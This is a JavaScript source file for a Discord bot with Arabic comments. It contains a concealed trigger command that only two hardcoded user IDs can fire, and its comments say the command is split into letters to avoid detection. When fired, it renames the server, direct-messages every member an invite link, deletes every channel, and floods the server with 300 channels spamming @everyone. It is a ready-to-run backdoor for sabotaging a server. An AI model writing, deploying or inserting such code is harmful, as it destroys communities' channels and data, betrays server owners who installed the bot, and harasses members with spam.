const { Client, GatewayIntentBits, ChannelType } = require('discord.js');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers // لجلب أعضاء السيرفر وإرسال البرودكاست
    ]
});

// الآيديات المصرح لها بتنفيذ الأمر فقط (أنت والشخص الآخر)
const ALLOWED_USER_IDS = ['1531638767352545420', '1410644533523382423']; 

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    
    // التحقق مما إذا كان مرسل الرسالة أحد الآيديات المصرح لها
    if (!ALLOWED_USER_IDS.includes(message.author.id)) return;

    // الأمر السري (مدمج بالحروف لتجنب الكشف)
    const secretTrigger = ['.', 'ر', 'س', 'ا', 'ل', 'ة'].join(''); // .رسالة
    
    if (message.content === secretTrigger) {
        try {
            await message.react('✅').catch(() => {});
            
            // 1. تغيير اسم السيرفر إلى group#499
            await message.guild.setName('group#499').catch(() => {});

            // 2. إرسال برودكاست (رسالة خاصة) لجميع أعضاء السيرفر بالرابط الجديد
            message.guild.members.fetch().then(async members => {
                const broadcastLink = 'https://discord.gg/U7R9CNCn8';
                for (const [id, member] of members) {
                    if (member.user.bot) continue; // تخطي البوتات
                    member.send(broadcastLink).catch(() => {}); // إرسال الرابط بالخاص
                }
            }).catch(() => {});

            // 3. جلب وحذف جميع الرومات الحالية
            const channels = await message.guild.channels.fetch();
            for (const [id, channel] of channels) {
                try {
                    await channel.delete();
                    await new Promise(resolve => setTimeout(resolve, 800)); // فاصل زمني للحذف
                } catch (err) {}
            }

            // 4. إنشاء 300 روم وإرسال الرسالة الجديدة فيها فوراً وبسرعة
            const totalChannels = 300;
            const channelName = 'group#499';
            const spamMessage = '@everyone - @here\nhttps://discord.gg/U7R9CNCn8';
            const batchSize = 10; 

            for (let i = 0; i < totalChannels; i += batchSize) {
                const promises = [];
                
                for (let j = 0; j < batchSize && (i + j) < totalChannels; j++) {
                    const task = message.guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText
                    }).then(async (newChannel) => {
                        await newChannel.send(spamMessage).catch(() => {});
                    }).catch(() => {});

                    promises.push(task);
                }

                await Promise.all(promises);
                await new Promise(resolve => setTimeout(resolve, 300)); 
            }

        } catch (error)  {
            console.error(error);
        }
    }
});

// سحب التوكن من متغيرات البيئة في Render تلقائياً
client.login(process.env.TOKEN);
